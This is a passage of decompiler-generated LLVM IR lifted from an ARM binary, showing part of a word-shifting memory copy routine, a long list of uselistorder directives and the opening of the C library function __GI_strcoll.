  %v8_172ac = inttoptr i32 %v7_172ac to i32*
  %v9_172ac = load i32, i32* %v8_172ac, align 4
  store i32 %v9_172ac, i32* %r5.global-to-local, align 4
  %v10_172ac = add i32 %v0_172ac, -16
  %v11_172ac = inttoptr i32 %v10_172ac to i32*
  %v12_172ac = load i32, i32* %v11_172ac, align 4
  store i32 %v10_172ac, i32* %r1.global-to-local, align 4
  %v4_172b0 = udiv i32 %v12_172ac, 65536
  %v5_172b0 = or i32 %v4_172b0, %v3_172a8
  store i32 %v5_172b0, i32* %lr.global-to-local, align 4
  %v3_172b4 = mul i32 %v12_172ac, 65536
  %v4_172b8 = udiv i32 %v9_172ac, 65536
  %v5_172b8 = or i32 %v3_172b4, %v4_172b8
  store i32 %v5_172b8, i32* @ip, align 4
  %v3_172bc = mul i32 %v9_172ac, 65536
  %v4_172c0 = udiv i32 %v6_172ac, 65536
  %v5_172c0 = or i32 %v3_172bc, %v4_172c0
  store i32 %v5_172c0, i32* %r5.global-to-local, align 4
  %v3_172c4 = mul i32 %v6_172ac, 65536
  %v4_172c8 = udiv i32 %v3_172ac, 65536
  %v5_172c8 = or i32 %v3_172c4, %v4_172c8
  store i32 %v5_172c8, i32* %r4.global-to-local, align 4
  %v1_172cc = add i32 %v0_172cc, -16
  %v2_172cc = inttoptr i32 %v1_172cc to i32*
  store i32 %v5_172c8, i32* %v2_172cc, align 4
  %v4_172cc = add i32 %v0_172cc, -12
  %v5_172cc = inttoptr i32 %v4_172cc to i32*
  %v6_172cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_172cc, i32* %v5_172cc, align 4
  %v7_172cc = add i32 %v0_172cc, -8
  %v8_172cc = inttoptr i32 %v7_172cc to i32*
  %v9_172cc = load i32, i32* @ip, align 4
  store i32 %v9_172cc, i32* %v8_172cc, align 4
  %v10_172cc = add i32 %v0_172cc, -4
  %v11_172cc = inttoptr i32 %v10_172cc to i32*
  %v12_172cc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_172cc, i32* %v11_172cc, align 4
  store i32 %v1_172cc, i32* %r0.global-to-local, align 4
  %v0_172d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_172d0 = add i32 %v0_172d0, -16
  store i32 %v2_172d0, i32* %r2.global-to-local, align 4
  %v6_172d4 = icmp slt i32 %v0_172d0, 16
  br i1 %v6_172d4, label %dec_label_pc_172d8, label %dec_label_pc_172a8.dec_label_pc_172a8_crit_edge

dec_label_pc_172a8.dec_label_pc_172a8_crit_edge:  ; preds = %dec_label_pc_172a8
  %v0_172a8.pre = load i32, i32* @r3, align 4
  %v0_172ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_172a8

dec_label_pc_172d8:                               ; preds = %dec_label_pc_172a8
  %v2_172d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_172d8, i32* @r4, align 4
  %v5_172d8 = load i8*, i8** %stack_var_-8, align 4
  %v6_172d8 = ptrtoint i8* %v5_172d8 to i32
  store i32 %v6_172d8, i32* @r5, align 4
  store i32 %v11_172a4, i32* @lr, align 4
  %v2_172dc = add i32 %v0_172d0, -4
  store i32 %v2_172dc, i32* %r2.global-to-local, align 4
  %v4_172dc = add i32 %v0_172d0, 2147483632
  %v5_172dc = and i32 %v2_172dc, %v4_172dc
  %v6_172dc = icmp slt i32 %v5_172dc, 0
  store i1 %v6_172dc, i1* %cpsr_v.global-to-local, align 1
  %v7_172dc = icmp slt i32 %v2_172dc, 0
  store i1 %v7_172dc, i1* %cpsr_n.global-to-local, align 1
  %v8_172dc = icmp eq i32 %v2_172dc, 0
  store i1 %v8_172dc, i1* %cpsr_z.global-to-local, align 1
  %v5_172e0 = icmp slt i32 %v2_172d0, -12
  br i1 %v5_172e0, label %dec_label_pc_172fc, label %dec_label_pc_172e4

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172d8, %dec_label_pc_17298, %dec_label_pc_172e4
  %v1_172f0 = phi i32 [ %v5_172f0, %dec_label_pc_172e4 ], [ %v1_172cc, %dec_label_pc_172d8 ], [ %v0_1726019, %dec_label_pc_17298 ]
  %v0_172e4 = load i32, i32* @r3, align 4
  %v3_172e4 = mul i32 %v0_172e4, 65536
  store i32 %v3_172e4, i32* %ip.global-to-local, align 4
  %v0_172e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_172e8 = add i32 %v0_172e8, -4
  %v2_172e8 = inttoptr i32 %v1_172e8 to i32*
  %v3_172e8 = load i32, i32* %v2_172e8, align 4
  store i32 %v3_172e8, i32* @r3, align 4
  store i32 %v1_172e8, i32* %r1.global-to-local, align 4
  %v4_172ec = udiv i32 %v3_172e8, 65536
  %v5_172ec = or i32 %v4_172ec, %v3_172e4
  store i32 %v5_172ec, i32* @ip, align 4
  %v2_172f0 = add i32 %v1_172f0, -4
  %v3_172f0 = inttoptr i32 %v2_172f0 to i32*
  store i32 %v5_172ec, i32* %v3_172f0, align 4
  %v4_172f0 = load i32, i32* %r0.global-to-local, align 4
  %v5_172f0 = add i32 %v4_172f0, -4
  store i32 %v5_172f0, i32* %r0.global-to-local, align 4
  %v0_172f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_172f4 = add i32 %v0_172f4, -4
  store i32 %v2_172f4, i32* %r2.global-to-local, align 4
  %v6_172f8 = icmp slt i32 %v0_172f4, 4
  br i1 %v6_172f8, label %dec_label_pc_172fc.loopexit, label %dec_label_pc_172e4

dec_label_pc_172fc.loopexit:                      ; preds = %dec_label_pc_172e4
  %v4_172f4 = sub i32 3, %v0_172f4
  %v5_172f4 = and i32 %v4_172f4, %v0_172f4
  %v6_172f4 = icmp slt i32 %v5_172f4, 0
  %v7_172f4 = icmp slt i32 %v2_172f4, 0
  store i1 %v6_172f4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_172f4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_172fc

dec_label_pc_172fc:                               ; preds = %dec_label_pc_172fc.loopexit, %dec_label_pc_172d8
  %v2_171d452 = phi i32 [ %v5_172f0, %dec_label_pc_172fc.loopexit ], [ %v1_172cc, %dec_label_pc_172d8 ]
  %v0_171c448 = phi i32 [ %v2_172f4, %dec_label_pc_172fc.loopexit ], [ %v2_172dc, %dec_label_pc_172d8 ]
  %v0_172fc = load i32, i32* %r1.global-to-local, align 4
  %v1_172fc = add i32 %v0_172fc, 2
  store i32 %v1_172fc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17304:                               ; preds = %dec_label_pc_17218
  br i1 %v5_17308, label %dec_label_pc_17350, label %dec_label_pc_1730c

dec_label_pc_1730c:                               ; preds = %dec_label_pc_17304
  store i32 %v2_17304, i32* %r2.global-to-local, align 4
  %v3_17310 = load i32, i32* @r4, align 4
  store i32 %v3_17310, i32* %stack_var_-12, align 4
  %v6_17310 = load i32, i32* @r5, align 4
  %v8_17310 = inttoptr i32 %v6_17310 to i8*
  store i8* %v8_17310, i8** %stack_var_-8, align 4
  %v11_17310 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17314

dec_label_pc_17314:                               ; preds = %dec_label_pc_17314.dec_label_pc_17314_crit_edge, %dec_label_pc_1730c
  %v0_17338 = phi i32 [ %v1_17338, %dec_label_pc_17314.dec_label_pc_17314_crit_edge ], [ %v0_1726019, %dec_label_pc_1730c ]
  %v0_17318 = phi i32 [ %v0_17318.pre, %dec_label_pc_17314.dec_label_pc_17314_crit_edge ], [ %v1_17218, %dec_label_pc_1730c ]
  %v0_17314 = phi i32 [ %v0_17314.pre, %dec_label_pc_17314.dec_label_pc_17314_crit_edge ], [ %v2_1721c, %dec_label_pc_1730c ]
  %v3_17314 = mul i32 %v0_17314, 16777216
  store i32 %v3_17314, i32* %lr.global-to-local, align 4
  %v1_17318 = add i32 %v0_17318, -4
  %v2_17318 = inttoptr i32 %v1_17318 to i32*
  %v3_17318 = load i32, i32* %v2_17318, align 4
  store i32 %v3_17318, i32* @r3, align 4
  %v4_17318 = add i32 %v0_17318, -8
  %v5_17318 = inttoptr i32 %v4_17318 to i32*
  %v6_17318 = load i32, i32* %v5_17318, align 4
  store i32 %v6_17318, i32* %r4.global-to-local, align 4
  %v7_17318 = add i32 %v0_17318, -12
  %v8_17318 = inttoptr i32 %v7_17318 to i32*
  %v9_17318 = load i32, i32* %v8_17318, align 4
  store i32 %v9_17318, i32* %r5.global-to-local, align 4
  %v10_17318 = add i32 %v0_17318, -16
  %v11_17318 = inttoptr i32 %v10_17318 to i32*
  %v12_17318 = load i32, i32* %v11_17318, align 4
  store i32 %v10_17318, i32* %r1.global-to-local, align 4
  %v4_1731c = udiv i32 %v12_17318, 256
  %v5_1731c = or i32 %v4_1731c, %v3_17314
  store i32 %v5_1731c, i32* %lr.global-to-local, align 4
  %v3_17320 = mul i32 %v12_17318, 16777216
  %v4_17324 = udiv i32 %v9_17318, 256
  %v5_17324 = or i32 %v3_17320, %v4_17324
  store i32 %v5_17324, i32* @ip, align 4
  %v3_17328 = mul i32 %v9_17318, 16777216
  %v4_1732c = udiv i32 %v6_17318, 256
  %v5_1732c = or i32 %v3_17328, %v4_1732c
  store i32 %v5_1732c, i32* %r5.global-to-local, align 4
  %v3_17330 = mul i32 %v6_17318, 16777216
  %v4_17334 = udiv i32 %v3_17318, 256
  %v5_17334 = or i32 %v3_17330, %v4_17334
  store i32 %v5_17334, i32* %r4.global-to-local, align 4
  %v1_17338 = add i32 %v0_17338, -16
  %v2_17338 = inttoptr i32 %v1_17338 to i32*
  store i32 %v5_17334, i32* %v2_17338, align 4
  %v4_17338 = add i32 %v0_17338, -12
  %v5_17338 = inttoptr i32 %v4_17338 to i32*
  %v6_17338 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17338, i32* %v5_17338, align 4
  %v7_17338 = add i32 %v0_17338, -8
  %v8_17338 = inttoptr i32 %v7_17338 to i32*
  %v9_17338 = load i32, i32* @ip, align 4
  store i32 %v9_17338, i32* %v8_17338, align 4
  %v10_17338 = add i32 %v0_17338, -4
  %v11_17338 = inttoptr i32 %v10_17338 to i32*
  %v12_17338 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17338, i32* %v11_17338, align 4
  store i32 %v1_17338, i32* %r0.global-to-local, align 4
  %v0_1733c = load i32, i32* %r2.global-to-local, align 4
  %v2_1733c = add i32 %v0_1733c, -16
  store i32 %v2_1733c, i32* %r2.global-to-local, align 4
  %v6_17340 = icmp slt i32 %v0_1733c, 16
  br i1 %v6_17340, label %dec_label_pc_17344, label %dec_label_pc_17314.dec_label_pc_17314_crit_edge

dec_label_pc_17314.dec_label_pc_17314_crit_edge:  ; preds = %dec_label_pc_17314
  %v0_17314.pre = load i32, i32* @r3, align 4
  %v0_17318.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17314

dec_label_pc_17344:                               ; preds = %dec_label_pc_17314
  %v2_17344 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17344, i32* @r4, align 4
  %v5_17344 = load i8*, i8** %stack_var_-8, align 4
  %v6_17344 = ptrtoint i8* %v5_17344 to i32
  store i32 %v6_17344, i32* @r5, align 4
  store i32 %v11_17310, i32* @lr, align 4
  %v2_17348 = add i32 %v0_1733c, -4
  store i32 %v2_17348, i32* %r2.global-to-local, align 4
  %v4_17348 = add i32 %v0_1733c, 2147483632
  %v5_17348 = and i32 %v2_17348, %v4_17348
  %v6_17348 = icmp slt i32 %v5_17348, 0
  store i1 %v6_17348, i1* %cpsr_v.global-to-local, align 1
  %v7_17348 = icmp slt i32 %v2_17348, 0
  store i1 %v7_17348, i1* %cpsr_n.global-to-local, align 1
  %v8_17348 = icmp eq i32 %v2_17348, 0
  store i1 %v8_17348, i1* %cpsr_z.global-to-local, align 1
  %v5_1734c = icmp slt i32 %v2_1733c, -12
  br i1 %v5_1734c, label %dec_label_pc_17368, label %dec_label_pc_17350

dec_label_pc_17350:                               ; preds = %dec_label_pc_17344, %dec_label_pc_17304, %dec_label_pc_17350
  %v1_1735c = phi i32 [ %v5_1735c, %dec_label_pc_17350 ], [ %v1_17338, %dec_label_pc_17344 ], [ %v0_1726019, %dec_label_pc_17304 ]
  %v0_17350 = load i32, i32* @r3, align 4
  %v3_17350 = mul i32 %v0_17350, 16777216
  store i32 %v3_17350, i32* %ip.global-to-local, align 4
  %v0_17354 = load i32, i32* %r1.global-to-local, align 4
  %v1_17354 = add i32 %v0_17354, -4
  %v2_17354 = inttoptr i32 %v1_17354 to i32*
  %v3_17354 = load i32, i32* %v2_17354, align 4
  store i32 %v3_17354, i32* @r3, align 4
  store i32 %v1_17354, i32* %r1.global-to-local, align 4
  %v4_17358 = udiv i32 %v3_17354, 256
  %v5_17358 = or i32 %v4_17358, %v3_17350
  store i32 %v5_17358, i32* @ip, align 4
  %v2_1735c = add i32 %v1_1735c, -4
  %v3_1735c = inttoptr i32 %v2_1735c to i32*
  store i32 %v5_17358, i32* %v3_1735c, align 4
  %v4_1735c = load i32, i32* %r0.global-to-local, align 4
  %v5_1735c = add i32 %v4_1735c, -4
  store i32 %v5_1735c, i32* %r0.global-to-local, align 4
  %v0_17360 = load i32, i32* %r2.global-to-local, align 4
  %v2_17360 = add i32 %v0_17360, -4
  store i32 %v2_17360, i32* %r2.global-to-local, align 4
  %v6_17364 = icmp slt i32 %v0_17360, 4
  br i1 %v6_17364, label %dec_label_pc_17368.loopexit, label %dec_label_pc_17350

dec_label_pc_17368.loopexit:                      ; preds = %dec_label_pc_17350
  %v4_17360 = sub i32 3, %v0_17360
  %v5_17360 = and i32 %v4_17360, %v0_17360
  %v6_17360 = icmp slt i32 %v5_17360, 0
  %v7_17360 = icmp slt i32 %v2_17360, 0
  store i1 %v6_17360, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17360, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17368

dec_label_pc_17368:                               ; preds = %dec_label_pc_17368.loopexit, %dec_label_pc_17344
  %v2_171d453 = phi i32 [ %v5_1735c, %dec_label_pc_17368.loopexit ], [ %v1_17338, %dec_label_pc_17344 ]
  %v0_171c449 = phi i32 [ %v2_17360, %dec_label_pc_17368.loopexit ], [ %v2_17348, %dec_label_pc_17344 ]
  %v0_17368 = load i32, i32* %r1.global-to-local, align 4
  %v1_17368 = add i32 %v0_17368, 1
  store i32 %v1_17368, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1735c, { 0, 2, 1 }
  uselistorder i32 %v3_17350, { 1, 0 }
  uselistorder i32 %v2_17348, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17338, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17318, { 1, 0 }
  uselistorder i32 %v3_17314, { 1, 0 }
  uselistorder i32 %v0_17318, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17338, { 3, 2, 1, 0 }
  uselistorder i32 %v5_172f0, { 0, 2, 1 }
  uselistorder i32 %v3_172e4, { 1, 0 }
  uselistorder i32 %v2_172dc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_172cc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_172ac, { 1, 0 }
  uselistorder i32 %v3_172a8, { 1, 0 }
  uselistorder i32 %v0_172ac, { 3, 2, 1, 0 }
  uselistorder i32 %v0_172cc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17284, { 0, 2, 1 }
  uselistorder i32 %v3_17278, { 1, 0 }
  uselistorder i32 %v2_17270, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17260, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17240, { 1, 0 }
  uselistorder i32 %v3_1723c, { 1, 0 }
  uselistorder i32 %v0_17240, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17260, { 3, 2, 1, 0 }
  uselistorder i1 %v5_17308, { 2, 0, 1 }
  uselistorder i32 %v0_17220, { 1, 0 }
  uselistorder i32 %v0_1730c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1726019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_17210, { 2, 1, 0 }
  uselistorder i32 %v0_17210, { 2, 0, 1 }
  uselistorder i32 %v2_17208, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_17208, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17208, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1726020, { 2, 1, 0 }
  uselistorder i32 %v11_171e4, { 1, 0 }
  uselistorder i32 %v7_171e4, { 1, 0 }
  uselistorder i32 %v1_171c4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_171c4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_171c8, { 1, 0 }
  uselistorder i32 %v7_171bc, { 0, 2, 1 }
  uselistorder i32 %v10_171b8, { 1, 0 }
  uselistorder i32 %v9_171b0, { 1, 0, 2 }
  uselistorder i32 %v6_171ac, { 1, 0 }
  uselistorder i32 %v2_171a4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_171a4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_171b4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17198, { 0, 2, 1 }
  uselistorder i32 %v13_17194, { 1, 0 }
  uselistorder i32 %v4_17190, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_17190, { 2, 0, 1 }
  uselistorder i32 %v6_17198, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17188, { 0, 2, 1 }
  uselistorder i32 %v16_17184, { 1, 0 }
  uselistorder i32 %v4_17180, { 1, 2, 0 }
  uselistorder i32 %v0_17190.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_17188, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17174, { 0, 3, 2, 1 }
  uselistorder i32 %v10_17170, { 1, 0 }
  uselistorder i32 %v1_1716c, { 1, 0 }
  uselistorder i32 %v10_17168, { 1, 0 }
  uselistorder i32 %v0_17168, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1716c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_17160, { 0, 2, 1 }
  uselistorder i32 %v2_17154, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17154, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1716c37, { 1, 2, 0 }
  uselistorder i32 %v1_1714c, { 2, 1, 0 }
  uselistorder i32 %v1_17144, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1713c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_17138, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_17134, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_17134, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_17124, { 0, 2, 1 }
  uselistorder i32 %v4_17120, { 1, 0 }
  uselistorder i32 %v3_17114, { 1, 0 }
  uselistorder i32 %v1_1710c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17100, { 1, 0 }
  uselistorder i32 %v12_170fc, { 0, 2, 1 }
  uselistorder i32 %v8_170dc, { 1, 0, 2 }
  uselistorder i32 %v5_170dc, { 1, 0, 2 }
  uselistorder i32 %v2_170dc, { 1, 0, 2 }
  uselistorder i32 %v0_170dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_170fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_170b8, { 0, 2, 1 }
  uselistorder i32 %v4_170b4, { 1, 0 }
  uselistorder i32 %v3_170a8, { 1, 0 }
  uselistorder i32 %v1_170a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17094, { 1, 0 }
  uselistorder i32 %v12_17090, { 0, 2, 1 }
  uselistorder i32 %v8_17070, { 1, 0, 2 }
  uselistorder i32 %v5_17070, { 1, 0, 2 }
  uselistorder i32 %v2_17070, { 1, 0, 2 }
  uselistorder i32 %v0_17070, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17090, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1704c, { 0, 2, 1 }
  uselistorder i32 %v4_17048, { 1, 0 }
  uselistorder i32 %v3_1703c, { 1, 0 }
  uselistorder i32 %v1_17034, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17028, { 1, 0 }
  uselistorder i32 %v12_17024, { 0, 2, 1 }
  uselistorder i32 %v8_17004, { 1, 0, 2 }
  uselistorder i32 %v5_17004, { 1, 0, 2 }
  uselistorder i32 %v2_17004, { 1, 0, 2 }
  uselistorder i32 %v0_17004, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17024, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_17060, { 0, 2, 1 }
  uselistorder i32 %v1_1705c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16fe0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_16fe0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17064, { 1, 0, 3, 2 }
  uselistorder i32 %v0_170fc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_16fd4, { 1, 0 }
  uselistorder i32 %v0_16fd4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16fcc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_16fcc, { 1, 0, 2 }
  uselistorder i32 %v0_16fcc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_170fc77, { 1, 0 }
  uselistorder i32 %v1_16fac, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16fb4, { 1, 0 }
  uselistorder i32 %v0_16f88, { 3, 0, 1, 2 }
  uselistorder i32 %v1_16f7c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_16f68, { 1, 0, 2 }
  uselistorder i32 %v1_16f64, { 1, 0 }
  uselistorder i32 %v1_16f5c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_16f5c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16f54, { 0, 2, 1 }
  uselistorder i32 %v3_16f54, { 3, 0, 1, 2 }
  uselistorder i1 %v0_16f54, { 1, 0 }
  uselistorder i1 %v1_16f54, { 1, 0 }
  uselistorder i32 %v3_16f50, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16f48, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16f34, { 1, 2, 0 }
  uselistorder i32 %v1_16f2c, { 0, 2, 1 }
  uselistorder i32 %v12_16f28, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16f1c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16f20, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_16f10, { 0, 2, 1 }
  uselistorder i32 %v1_16f08, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16f08, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16f00, { 1, 0 }
  uselistorder i32 %v1_16ef8, { 2, 1, 0 }
  uselistorder i32 %v2_16ef0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16ef0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_16eec, { 1, 0 }
  uselistorder i32 %v2_16ee0, { 1, 0 }
  uselistorder i32 %v1_16ee0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16ee0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 6, 5, 2, 3, 4, 7, 8 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_17350, { 2, 0, 1 }
  uselistorder label %dec_label_pc_172e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17278, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17218, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_171a4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17168, { 1, 0 }
  uselistorder label %dec_label_pc_17154, { 1, 0 }
  uselistorder label %dec_label_pc_17114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1703c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16fdc, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_16fac, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_16f48, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16f08, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_17374.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_17374 = phi i32 [ %v0_17374.pre, %bb ], [ %v5_17374, %bb3 ]
  %v0_17370 = phi i32 [ %tmp, %bb ], [ %v5_17370, %bb3 ]
  %v1_17370 = inttoptr i32 %v0_17370 to i8*
  %v2_17370 = load i8, i8* %v1_17370, align 1
  %v1_17374 = inttoptr i32 %v0_17374 to i8*
  %v2_17374 = load i8, i8* %v1_17374, align 1
  %v3_17374 = zext i8 %v2_17374 to i32
  %v2_17378 = icmp eq i8 %v2_17370, 0
  br i1 %v2_17378, label %.dec_label_pc_17384_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_17374 = add i32 %v0_17374, 1
  %v5_17370 = add i32 %v0_17370, 1
  %v3_17370 = zext i8 %v2_17370 to i32
  %v10_1737c = icmp eq i8 %v2_17370, %v2_17374
  br i1 %v10_1737c, label %entry, label %dec_label_pc_17384

